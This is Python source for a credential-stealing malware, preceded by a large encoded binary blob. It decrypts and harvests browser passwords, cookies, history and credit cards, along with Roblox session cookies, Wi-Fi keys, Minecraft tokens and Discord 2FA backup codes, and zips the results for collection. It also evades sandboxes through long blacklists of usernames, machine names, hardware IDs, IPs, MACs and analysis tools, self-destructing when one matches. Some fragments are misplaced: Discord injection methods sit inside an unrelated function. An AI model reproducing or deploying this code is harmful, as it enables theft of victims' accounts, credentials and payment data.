\xfc\xb1\x94\xfe\xb5\xf8\xd5\x9c\xf3\xff\xad\x98\xfc\x08\x98\x9f\x8c\x05Z\xfb\x07\\\x85\xf1\x9f\xeeT\xf1\xcbV\xfe?7\xfe\xe1\xb9\xbf,\xffC\xfc\xca\xb2\x7f\xb5~\x93\xf9MS>^\xbb\x16\xff\xbb\xf4\xe4\x97\x98\xfc\xcf\xc0?\x8cW~\xfd\xdbh\xffj\x7f\xd3.\xe1\xbf\xa7\xe2\xc9K\xed\xffs\xfc\x93\x99\xcc\r\xad\xe4y\xca\xf9\xff\xa2@\xf9\xb3\xf8\xcb\x9c\xc3\xfb\x85)/\xc8\xfe\xb5\xe2\x978>\x93\x10\xf1\x8f\t\xe6\xcf5\xbe@\xca\xf0yb\xd9G\x98?\xe7\xa4}Y\xc6/oh|\xa9\xe7\xe7\x9c\xc7\x92\xf1_U\xf9\x9d\x94?\xc7\xccG\xd2\xb0\x8e\xfc\xf7\xb9\xd7\x7f\xea\xcf\xafk\xc4?\xd3\xbf\x91T\xf6\xc2\xbd\xce\xb7\x9d\x9e\\S\xf6>\x0c5\xb0\xf3s\x10\x9eNj\xff\x01\xc9\xff|\xf9>\x84}d\xdf_i\x9f\xcf\x0c}\xce\xe0\x95\xe9/\x0e\xc6?\xc4\xff\x0c~U\xe2\xf3\x88\x88\x1fq\xf6\xaf\xedO\\\xc7\xfe5\xf3OO|\xf6%\xb6\x07Q>\xd2\xf5\x96\xed\xdf5\xf0/\x90\xff\xb5\xf0\xffa\xff\xbd\xab\xcf\x93\xe6\xf8\xc7H\xf2q-\xcf:\x1f\xd8\xe2/\x10\x81>\xe5\xf2\xc3\xb8\xfc\r\'\xff\xa0\xb6W3\xb9\x93\x1c\x7fI8\xff\xc6W3\x9f\xda\xe1\x7fV\xfei\x8d\x7f\xe3\xca\xfe\xb5\xf27\xee\xb0\xbdE\xf1\x17}\xbe2\x1f]|\xb7\xab\xf5\xb9\x99_\x17\x9a\xff\xb2b\xf3_\xcc\xf9\x99\xf9\x0cIe\xcf$O\x83\x7f|\xfe\x9f\x15\x1f\xa4\xf2\xe1\xc0\xdfn\xe9\xa35\xfc\x7f\xf4\xfe\xb9\xf6\xb9\x93/\x8f\xf4\x07\x91\x7f\xe0\xda\xbf?\r\xff\xb8\xfcg7\xff\xb4\x11\xff\xa8\xfcN"\xbe:p\xee\xef\xd9\xfe\xf5\x96\xf9_+\xff_T\xe5s\xedz\xf3O\x93\xd6\xf6o\x87\x93\xe7\xd8c\x1fY\xf9\x02?\xc1\xfe=}\x1c\xe2\xf3\xad\xfd\x7f\t\xce/\t\xc5?\xde\xfe\xd5\xb5\x14t\xbc{\xe1\xe6\x1f|Z\x11\xf9 l\xfed(\xff\xcb6\x88\x1f\xb1\xfa\xf7f\xa3\xf8\x07\xcew\xe4\xe2=+\xaf\xbf}\xc1\xe1\x9f\x8f\xffq\xf9\x93\xa6\xfdk\xc7?\xae\x9b\xf3\x91V:/\x12\xb26J\xffZ\x87\x8d\xff\x12\xfe\xce%\xceG\xb7\xf8\xd5\xaeYo\xe5\xc4?b\x0f_3\xf6/\x18\xff26_\x85\xf7\xe7 >d\xe5\xef\x0e=\xfa\xcd\xca\x7f\t\x88\xff\xeeu/\x1b\xf21\x03\xe2\xbf\xdb\xc0?\xbf\xfd\xcb\xc4/\xe9\xfcv\x7f\xfe\x1f\x1f\xff\xa0\xf3K\xa4?\x9b\xe6\xe3\xca\xbelm\xff\xae\x87\x7f\xa5\xbe$\xf3\xc7q~\xb6\x19?\x7f7\xa4\xfc\x07\x84\xfda\xf1\x97\xd4\x89W\x98\xfe\x9c\x94\xe4\x07\xb5?\xd6\xd0\xbf M\x88\xafQ|\xc8\xf27\xed\xc0\x8e\x8fp\xfe\x10\x1b\xff\xb0\xf3\xff<\xf5\x01V~{U\xdf\xe3\xac70\xfe\xc1\xe6\x8f\x1b\xf5[\xb6\xfdF\xd9\x1f\xb9\xae\x1f4\xe5\xcf\x13\x7fk\x15\xff\xf0\xe9\xa3\xe6z\xab\x00\xffs;\xff\x1fU/T\xf2S%\x1b\x1f#d\xbf\xe9\xf8oY/D\xeb\xcb\xf5\xf1\xaf\xcc\x1f\xa2\xf83\xe6/\x1e\xfbW\xe6S\xcbz\xbf\xab\xab\xa85\xfe\x05\xc5\x7f\x1b\xe5o\xdb\xfe?\xca\xffB\xc5\x933\xee\xfe\x8e\x9b\xf9_\xb6\xad\xfc?3_\xd9\x8a\xcf\xcc\xb8x\xf2\r\xb6W\x9f\xd2\xff\xe7\xd4W\x84\xc5?\xc2\xf8_s\xfe_\x95?n\xd6cS\xf5\x97\xd9\x96\xe2\x1fv=\xb6\xe9\xdf-\x02\xed_6\xfe\xe1\xc7\xbf\xc6\xfa7"\xfe\x8b\xebW\xb1\xff\xd4\xc9\xb7h\x89\x7f(\xfe\xdb"\xff\xb9@\xf1\xe9\xba\xfe\xe3*\xda*\xff\x13xJ\xdb\xbfN\xfd9\xc5\xff\xb2\xb2\xa7\xc4GH,\xff =h9\x9f\xff\x1c\xea\xffC\xfb\x97y\xf2\x13\r\x7fXp\xfe_\x1eX\xff[\xe2\xdfJ\x05\x1e\xa6A\xf1\x0f\x8c\x7fL}J\x00\xff\xb3\xed#\x05\xdc|}\xa8\x85\x7fN\xfdG\xda\x84\x7f\xa1\xf1\xdf\xd3\xc7\x11\xe1\x9f\xa4\xe2\xbfV\xfe\xfd\xb2\xa1\xff\x01\xe9\xff\xa3\xe3\xc9n\xfe_\x90\xff/\xa1\xeb\x1b\xed|\xbdu\xf1\xcf\xe2/\x13o\xfd\xf9\r\x19\x9fn\xac\xff\x8d[\xfa\xff,\xfb\xd7\xa9\xff \xea\x17\xae\xbez\xf2\x876\xcd\xff\x0b\xab\x7fK\xec\xfa2\x84\xcf\xb3-\xe0\x1f\xe2W\xcfW\xff\x81\xf0\x0f\xd5GY\xf99z~;D\xfe\x9a\xca\x7f\xc1\xf17\xaa\x7f\xc9\r\x1d\xff\x98\xc2\x91=\x99\xff\xef\t\xe2\x1f\xa8\xff\x8bG\x9f\xcf\x89\xfa\xe9\x95\x91\xcf\xbf]\xfeg\xe5\x87M\x8c\xfai\xdb\x1f;\x7f\xf1\x05\xd5\x1f\x85\xd7\x7fXxZ\xc5\xb7\xbez\xf5Q\xce\xf0\x17\xbb>\x00\xd9\xbf\xac\xff`\x9d\xfc\xe7L\xc9.\xb5\x7f\x82\xc4L\x1b\xea\xdf~v\xfc7\xf6\xf8\x9f\xc9|\xfe\x06\xfc\xcb\x1a\xfc\xbb\xa1\xf5obOA&O\xc7\xcd\xf1\x0f\xaa\xffA\x89/\x16_\x13\xda\xca\x13\x9f\xa1\xfd\xa7{v<O|n\xce\xd5\x97\x85\xe1\x1f\xf6\xdf\xfb\xf0O\xe2U\xa2\xfdM,\xfe\xe1|\x95u\xfd\x7ff?\x9e\x89\x9e\x9f\xb3\x7fc\xae>t\xc9\xeb\x8f\x16\xf9/\x08\xff\x18\xfd\xe6\xb5?\x8a\xe6\xf8\xd1&\xf1\x0f\xc6_L\xd7\'\x17\xb6\xbd*~c\xb2i\xfc\x03\xe7\xc7^\xa58_\x1e\xe5\xbf\x98\xf5\xfbT\xfe\xdf\x88\x8f\x7f`<u\xea\x89\xad\xfa\xfd\xfd#\xb6\xff\xd5\xc0\xc3\xafP\xfe\xf8\x16\xf2\x9f\xad\xfa2\xb3\x1fE\x87\xeeo\x86\xe3\x0b\xa1\xf1\x0f\xdb\xbfa\xf6/\xb9\r\xea_\xe2\xe0\xcb\x82\xab\x8f/\xb6\x1b\xffP\xfb\xe7\x89\xf7\x90\xf5y\xbe\xfa\x8a\xc0\xfc\x97M\xf0\xaf\xf4\x97p\xf1\xbc\xf5\xe2\x1f\xde\xfcST\xaf+qMf8\xff\xb1\x7f\xe3\xe9\x7f@\xe6\x8b\xf2\xfd\x0f\x1a\xf0\x8f\xec\xdf\x84\xea\x9dSo\x7f\x9f\xed\xf0\xbf\x8c\xed\x1f\x81\xf1\xc5\xe2\xcfS\xda\xfe=:(\x88\xfc\xf1\xd2\x7f\xd0\x14O.\x9a\xe3\x1f\x01\xf6[D\xcb\xcbf\xf9\x7fwl\xbc\xc7\xc3w\xd1}[\x0f\xff\x8c\xfe%N\xffI9\x17\x8f?\xc7\xac\x17g\xf5\x07Y\xffK\xf7O\\\xbf\xfe\xcd\x8a\xffz\xfac\xb6\xca\x7f)\x88\xfe\x8e+\x0f\xfe\x11\xfd#\xc8\xfe\x7f\xcfX\xff\x8b\xf6\xcf8_\x9c\x0fg\xfa\xb3\xd7\xb7\x7fC\xea\x7f\xed\xfcb\xe9oOu\xfc\x12\xd5\xefo\x10\xff\xe8\xb8\xfd;\xed\xfeM9m\xcf`\xfc\xe3\xeb\x07[\xd4\x7f4\xe4O\x1a\xf7\x03\xe2Q\xea|\xed\xfa2\xb2~f}\xff\xdff\xf5\xbf9]\xcf\xfe<\xf9\x7f\x8e\xff\x8f\xe0\x93U<\xe0\x99\xf3\xff\xc8z\xb0g\xb2\x7f\xed\xf8\x07\xe6\x7f\x1b\xf6?h\xe3\xff\xf3\xf1\xbfa\xb3\x7f\x88\xe9\xff\xe2\xed\x7f\xea\xea\x0f\x9c\xbf+\xfb\xf9\x96\xf6%\x99\xff\xec\xe9\xcf\xc0\xf3I\xb6_\x86S\x9fg\xf4?\xa5\xfc\xbbO\x94\xff\xe7\xe9\x7f\xa0\xfdM)\x97\xff\x12\xd0\xdf"\xac\xfe\xd7\xca\x1f\'\xf2\xb9Z\xe5\xbf\x88\xf7\xbey\xf0\x8f\xba\xbf\x9a?\'\x84\xfd[\x7f\x8e\xd1oV\xfd[\xd5\x1f\xce\xca_\xdb\xc8\xfe\x95\xd1 C_:\xf9\x7f\r\xf8\xc7\xe4\xdf\xc7\x81\xf9/\x88\xff\xd1\xf5\x01N>\xbfbA\x8a1\x9e\x8e\x9b\xfbs\xad_\xff\xeb\xe9\xf7\x1a\x90\xffW\xd7\xbf\xdd\xfc\xbf\xca\xff\xdb6\xffk\xae\x1f\xc4\xfev\xaa\x1fm\xbci\xfe\xcb6\xec\xdf\x96\xfd\xff\x9e\xae\xfe-m\xdd\xff*,\xff\x05\xe5\xafa\x7f"U\xffQ\xe7K\x81r}w\xad\x9fJ\x12\xe0\x9f\xdc\x0e\xfe9\xf6B\xdd\xff/&\xf3;\x7fB\xfe_c\xff\x97\x16\xfc\x8f\xee\xff\x12;\xf9\xbbH\xfe\x18\xff\x1f\xbc\xb7F\xfd\xef\xd3\xe0_\xba\xad\xfeW\xed\xfd\x7f\xf0\x0f\xc3\x87vq\xbc\xb1=\xfe\xc5k\xf4\x1f\x0f\xe8\xb7\xbe\x16\xff\x0b\xec\xffl\xf732\xfayx\xfb\x8f\xfb\xed_\xc6\xde\xa2\xed}\xb7\xffx\xfb\xfa\x8f\x96\xf9\xcft\xfe\x86\x1d\xff\x85\xfe\x9d\xd1\xde\xe3\xc8\xc9\x7f\xa9\x9f\x0f\xa1\xfb\xad\xdf\x84\xf7?\x90\xf33\xfdk\x81\xfd\x9fa\xff\xa8|t]\xff\xb6\xe0\xf2_\x9a\xfa\xbfl\xc5\xff\x87\xf3AZ\xf5?]5?\x1f\xc2\x9b_\x8c\xea9\x11\x1f\xb7\xf9\x1f\xd3\x0f\xb9\r\xfeY\xfe+\xee\xf9\x0bL\x7f\x1f\xc97R\xbe\x9e\xc4\xd7\xffe\xed\xfa\xdf\xc6\xfe\xcfl\xff\x83\xe0\xfa\x0fG\xffz\xfa?S\xfe\xd3V\xf8\x97\x87?\xff\x83~~O\xfd\xbc\x1d\xb9\xde)\xe7\xbf\x1f\xad\xd7\xff\x85\xcb\x7f9Y\xa9~\xfaL\xfd/\xf2\xaf\x99\xf8\x97x\xf2;\x9b\xfcWl\xff+\xfa\xf93\xf6\xf3\r\xde\x8f\x13\xe2\xfe\x86\xc6?\xd8\xfa\x8fm\xf4?\xb0\xfa_\x99\xf9u4\xfe\xb5\x88\xff&\x9e\xfb\xa1\xf9.\xd3_\xcf\x92\xe7\x8d\xf0\xafM\xff\x17z\xff~^\xfd/]\xdf#\xf3\xff<\xf5ok\xe2\x9f\'\xdeM\xf7s\x1br\xfeN\xab\xfe\xad\xbd\xff/#\xea\x03\xe2\xc0\xfe\x07\xa1\xfd\x9f\xa3\x96\xcf\xafh\xd9\xff\x00\xd9\xe7\x9e\xf8t@\xfe\x0b\xbe\xbf\xa7\x11\xe1\x7fa\xf8\x9f\xc9\x9f\xe3@\xfbrM\xff\x1fU\xff\xc1\xf6g\xddV\xfc\xc3\xf6\x17;\xfe\x12\xd2\x7f\xe0\xb5?\x16[\xb5\x7f\xf5\xf3I\x88|G\x08\xc30\xfe\x83\xe7\xe7\x7fI\xb3\xfe\r\xe5\x7fa\xf1\x8f\x10\xfb\xf7\xe3\xc8[\xbf?i\xee\xff\x12\x9e\xffg\xdd\xdf5\xe3\xbf(>\xb3I\xff\x97\x86\xfe\xf7\xf2|\xf5\x13\xf7\x9c\xfe\xf2\xa1\xf1\x8f\x9c\xf5G\xe0\xfe\x02V\xfdG\xc4\xe5\xcbS\xf9\x98\xd7F~\xce\xb6\xfa\xff\xd9\xf1(\xaa?\x7f\xf3\xf3{\xd4\xf3C\xcd\xfe\xfc\xdb\xcc\xff\xb3\xe2\x0b&\xff[r\xfd_\xd6\xe9\x7f\xb0&\xfe\xd9\xfcT\xe7\xff\x15\xde\xfe\xa7k\xd5\xbf\xb5\x8c\xff\x96\xfeS\xca\x1e\xdc\xb4\xff\xe93\xd5\xff\xce\xb9\xe7\x97M\x98\xfe\x9de?Z&\x9fu\xce\xf9O\xd3\xed\xf2?\xba\xbf\n\x11O\xa1\xf8_\xe2\xad\xffh\xdf\xff\xa0\xe0\xeb\xdf\xda\xe1_x\xff\xabm\xf7\x7fF\xfc~\xb3\xfc?\xc7~\x93\xf8L\xc6?,\xff\xa9c_6\xf6_{\xba\xfa\x0f\xed\xbf\x7f\xe0\xea\x93\xd3\xc0\xe7\xeb\xfa\xfa?\xa3\xe7A\xf2\xfd\xb3\xcb\xfd\xa3\x9e_\x916\xe4??K\xff?6\xbfs\x83\xfa7\xe7~\xbc\xf8b\xe2\x8b\xcd\x87&3\xcf\xf3C=\xf1\x8fg\xeb\xffw\xb7i\xfeK\x1d\xbf,\xac\xe7\xa78\xfd^Q\xfed]o\x15\x18\xffx\xf2\xfeWL~\xc9\x80\xee\'\xd8>\xff\xc5\xe9\xdfn\xf1\xbf\xa5\xae\xadg\x9f\x7f\xb4\xad\xfc\xbf\x96\xfd\xef\xdd\xfc\xbf\x1b\x9ao\x98\xe7\xeb\x8d\x7f(\xf9\xeb\x10\xcf\x933\xfb\xff!|\t\xec\xff\xd7x\xbe!\xfd\xafX\xff\x1f\xf1\xfcd"\xff\x85\xf3\x1f\xacm\xff\xb6\xed\x7f57\xfc\x11\x8d\xf5ol\xff+\xf7\xbe!>\xfe\xb4\xf9/\xa1\xfd-6\xae\xffX\xb6\xac\x7f\x93O\xbfb\xf3\x81\xcd\xe7\x11\xb8\xfc\xd9\x8c\x7f\x98\xf1\xb7\xf2|\x03\xea\x7f\x9d\xfeC\xa4\xfe%\xeb\x9d\xc9\xe7\x9f\xdf\x9b\xf8l\xfa\x9b\xac\xfc\xc9\x15W\xff\x9b5\xf8\xff\\\xfb|Z=\x0f-&\x9e\x079\xe4\xfa\xaf\xc5D\xbf\xf5Q\x95\x9f}]\xe1\xc175\x1e|\xb7\xca\xb7-\xf9F\xf7\xf3\x83]\xcf$m\x88\xceE/\xae\xf2\xeb\xea~\x0f%\xd2\xa8\xf8jO\x1e\x94\xf47\xa5\xb0\xde9p\x9a\x05L\x08\xd8\x92\xbc\x92/.\xe1\xbd)\x8c\xf2\x00G1\x84\xd2\xad\xefj_\x04\xc6&JU\xc6\xb7\xafw\xfa1\x98\xbe\xbd7\x82\xc4\xf4\xf6\x7f\x1c\xff\xf6\xf7\xe8\xaf;;;\xff\x07\xd3\x1b\xabl'))))

@try_extract
class Browsers:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browsers = {
            'amigo': self.appdata + '\\Amigo\\User Data',
            'torch': self.appdata + '\\Torch\\User Data',
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
        }

        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

        os.makedirs(os.path.join(tempfolder, "Browser"), exist_ok=True)
        os.makedirs(os.path.join(tempfolder, "Roblox"), exist_ok=True)

        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue

            self.masterkey = self.get_master_key(path + '\\Local State')
            self.funcs = [
                self.cookies,
                self.history,
                self.passwords,
                self.credit_cards
            ]

            for profile in self.profiles:
                for func in self.funcs:
                    try:
                        func(name, path, profile)
                    except:
                        pass

        self.roblox_cookies()

    def get_master_key(self, path: str) -> str:
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

    def passwords(self, name: str, path: str, profile: str):
        path += '\\' + profile + '\\Login Data'
        if not os.path.isfile(path):
            return

        loginvault = create_temp()
        copy2(path, loginvault)
        conn = sqlite3.connect(loginvault)
        cursor = conn.cursor()
        with open(os.path.join(tempfolder, "Browser", "Browser Passwords.txt"), 'a', encoding="utf-8") as f:
            for res in cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall():
                url, username, password = res
                password = self.decrypt_password(password, self.masterkey)
                if url != "":
                    f.write(f"URL: {url}  Username: {username}  Password: {password}\n")
        cursor.close()
        conn.close()
        os.remove(loginvault)

    def cookies(self, name: str, path: str, profile: str):
        path += '\\' + profile + '\\Network\\Cookies'
        if not os.path.isfile(path):
            return
        cookievault = create_temp()
        copy2(path, cookievault)
        conn = sqlite3.connect(cookievault)
        cursor = conn.cursor()
        with open(os.path.join(tempfolder, "Browser", "Browser Cookies.txt"), 'a', encoding="utf-8") as f:
            for res in cursor.execute("SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies").fetchall():
                host_key, name, path, encrypted_value, expires_utc = res
                value = self.decrypt_password(encrypted_value, self.masterkey)
                if host_key and name and value != "":
                    f.write("{}\t{}\t{}\t{}\t{}\t{}\t{}\n".format(
                        host_key, 'FALSE' if expires_utc == 0 else 'TRUE', path, 'FALSE' if host_key.startswith('.') else 'TRUE', expires_utc, name, value))
        cursor.close()
        conn.close()
        os.remove(cookievault)

    def history(self, name: str, path: str, profile: str):
        path += '\\' + profile + '\\History'
        if not os.path.isfile(path):
            return
        historyvault = create_temp()
        copy2(path, historyvault)
        conn = sqlite3.connect(historyvault)
        cursor = conn.cursor()
        with open(os.path.join(tempfolder, "Browser", "Browser History.txt"), 'a', encoding="utf-8") as f:
            sites = []
            for res in cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall():
                url, title, visit_count, last_visit_time = res
                if url and title and visit_count and last_visit_time != "":
                    sites.append((url, title, visit_count, last_visit_time))
            sites.sort(key=lambda x: x[3], reverse=True)
            for site in sites:
                f.write("Visit Count: {:<6} Title: {:<40}\n".format(site[2], site[1]))
        cursor.close()
        conn.close()
        os.remove(historyvault)

    def credit_cards(self, name: str, path: str, profile: str):
        path += '\\' + profile + '\\Web Data'
        if not os.path.isfile(path):
            return
        cardvault = create_temp()
        copy2(path, cardvault)
        conn = sqlite3.connect(cardvault)
        cursor = conn.cursor()
        with open(os.path.join(tempfolder, "Browser", "Browser Creditcards.txt"), 'a', encoding="utf-8") as f:
            for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
                name_on_card, expiration_month, expiration_year, card_number_encrypted = res
                if name_on_card and card_number_encrypted != "":
                    f.write(
                        f"Name: {name_on_card}   Expiration Month: {expiration_month}   Expiration Year: {expiration_year}   Card Number: {self.decrypt_password(card_number_encrypted, self.masterkey)}\n")
        f.close()
        cursor.close()
        conn.close()
        os.remove(cardvault)

    def roblox_cookies(self):
        with open(os.path.join(tempfolder, "Roblox", "Roblox Cookies.txt"), 'w', encoding="utf-8") as f:
            f.write(f"{github}\n\n")
            with open(os.path.join(tempfolder, "Browser", "Browser Cookies.txt"), 'r', encoding="utf-8") as f2:
                for line in f2:
                    if ".ROBLOSECURITY" in line:
                        f.write(line.split(".ROBLOSECURITY")[1].strip() + "\n")
            f2.close()
        f.close()


@try_extract
class Wifi:
    def __init__(self):
        self.wifi_list = []
        self.name_pass = {}

        os.makedirs(os.path.join(tempfolder, "Wifi"), exist_ok=True)

        with open(os.path.join(tempfolder, "Wifi", "Wifi Passwords.txt"), 'w', encoding="utf-8") as f:
            f.write(f"{github} | Wifi Networks & Passwords\n\n")

        data = subprocess.getoutput('netsh wlan show profiles').split('\n')
        for line in data:
            if 'All User Profile' in line:
                self.wifi_list.append(line.split(":")[-1][1:])
            else:
                with open(os.path.join(tempfolder, "Wifi", "Wifi Passwords.txt"), 'w', encoding="utf-8") as f:
                    f.write(f'There is no wireless interface on the system. Ethernet using twat.')
                f.close()

        for i in self.wifi_list:
            command = subprocess.getoutput(
                f'netsh wlan show profile "{i}" key=clear')
            if "Key Content" in command:
                split_key = command.split('Key Content')
                tmp = split_key[1].split('\n')[0]
                key = tmp.split(': ')[1]
                self.name_pass[i] = key
            else:
                key = ""
                self.name_pass[i] = key

        with open(os.path.join(tempfolder, "Wifi", "Wifi Passwords.txt"), 'w', encoding="utf-8") as f:
            for i, j in self.name_pass.items():
                f.write(f'Wifi Name : {i} | Password : {j}\n')
        f.close()


@try_extract
class Minecraft:
    def __init__(self):
        self.roaming = os.getenv("appdata")
        self.accounts_path = "\\.minecraft\\launcher_accounts.json"
        self.usercache_path = "\\.minecraft\\usercache.json"
        self.error_message = "No minecraft accounts or access tokens :("

        os.makedirs(os.path.join(tempfolder, "Minecraft"), exist_ok=True)
        self.session_info()
        self.user_cache()

    def session_info(self):
        with open(os.path.join(tempfolder, "Minecraft", "Session Info.txt"), 'w', encoding="cp437") as f:
            f.write(f"{github} | Minecraft Session Info\n\n")
            if os.path.exists(self.roaming + self.accounts_path):
                with open(self.roaming + self.accounts_path, "r") as g:
                    self.session = json.load(g)
                    f.write(json.dumps(self.session, indent=4))
            else:
                f.write(self.error_message)
        f.close()

    def user_cache(self):
        with open(os.path.join(tempfolder, "Minecraft", "User Cache.txt"), 'w', encoding="cp437") as f:
            f.write(f"{github}\n\n")
            if os.path.exists(self.roaming + self.usercache_path):
                with open(self.roaming + self.usercache_path, "r") as g:
                    self.user = json.load(g)
                    f.write(json.dumps(self.user, indent=4))
            else:
                f.write(self.error_message)
        f.close()


@try_extract
class BackupCodes:
    def __init__(self):
        self.path = os.environ["HOMEPATH"]
        self.code_path = '\\Downloads\\discord_backup_codes.txt'

        os.makedirs(os.path.join(tempfolder, "Discord"), exist_ok=True)
        self.get_codes()

    def get_codes(self):
        with open(os.path.join(tempfolder, "Discord", "2FA Backup Codes.txt"), "w", encoding="utf-8", errors='ignore') as f:
            f.write(f"{github}\n\n")
            if os.path.exists(self.path + self.code_path):
                with open(self.path + self.code_path, 'r') as g:
                    for line in g.readlines():
                        if line.startswith("*"):
                            f.write(line)
            else:
                f.write("No discord backup codes found")
        f.close()


def zipup():
    global localappdata
    localappdata = os.getenv('LOCALAPPDATA')

    _zipfile = os.path.join(localappdata, f'{os.getlogin()}.zip')
    zipped_file = ZipFile(_zipfile, "w", ZIP_DEFLATED)
    abs_src = os.path.abspath(tempfolder)
    for dirname, _, files in os.walk(tempfolder):
        for filename in files:
            absname = os.path.abspath(os.path.join(dirname, filename))
            arcname = absname[len(abs_src) + 1:]
            zipped_file.write(absname, arcname)
    zipped_file.close()

    def get_core(self, dir: str):
        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                modules = dir + '\\' + file + '\\modules'
                if not os.path.exists(modules):
                    continue
                for file in os.listdir(modules):
                    if re.search(r'discord_desktop_core-+?', file):
                        core = modules + '\\' + file + '\\' + 'discord_desktop_core'
                        if not os.path.exists(core + '\\index.js'):
                            continue
                        return core, file

    def start_discord(self, dir: str):
        update = dir + '\\Update.exe'
        executable = dir.split('\\')[-1] + '.exe'

        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                app = dir + '\\' + file
                if os.path.exists(app + '\\' + 'modules'):
                    for file in os.listdir(app):
                        if file == executable:
                            executable = app + '\\' + executable
                            subprocess.call([update,
                                             '--processStart',
                                             executable],
                                            shell=True,
                                            stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE)
class Debug:
    global tempfolder
    tempfolder = mkdtemp()

    def __init__(self):

        if self.checks():
            self.self_destruct()

    def checks(self):
        debugging = False

        self.blackListedUsers = [
            'WDAccount', 'Abby', 'hmarc', 'patex', 'RDh', 'kEecfMwgj', 'Frank', '5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8M', 'wA',
            'U1', 'test', 'Reg']
        self.blackListedPCNames = [
            'BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1',
            'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ',
            'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P',
            'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']
        self.blackListedHWIDS = [
            '7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555',
            '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A',
            '921E2042-70D3-F9F1-8CBD-B398A21F89C6']
        self.blackListedIPS = [
            '88.132.231.71', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', '194.154.78.160', '92.211.109.160', '195.74.76.222', '188.105.91.116',
            '34.105.183.68', '92.211.55.199', '79.104.209.33', '95.25.204.90', '34.145.89.174', '109.74.154.90', '109.145.173.169', '34.141.146.114', '212.119.227.151',
            '195.239.51.59', '192.40.57.234', '64.124.12.162', '34.142.74.220', '188.105.91.173', '109.74.154.91', '34.105.72.241', '109.74.154.92', '213.33.142.50',
            '109.74.154.91', '93.216.75.209', '192.87.28.103', '88.132.226.203', '195.181.175.105', '88.132.225.100', '92.211.192.144', '34.83.46.130', '188.105.91.143',
            '34.85.243.241', '34.141.245.25', '178.239.165.70', '84.147.54.113', '193.128.114.45', '95.25.81.24', '92.211.52.62', '88.132.227.238', '35.199.6.13', '80.211.0.97',
            '34.85.253.170', '23.128.248.46', '35.229.69.227', '34.138.96.23', '192.211.110.74', '35.237.47.12', '87.166.50.213', '34.253.248.228', '212.119.227.167',
            '193.225.193.201', '34.145.195.58', '34.105.0.27', '195.239.51.3', '35.192.93.107']
        self.blackListedMacs = [
            '00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de',
            '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06',
            '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d',
            '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e']
        self.blacklistedProcesses = [
            "httpdebuggerui", "wireshark", "fiddler", "regedit", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64",
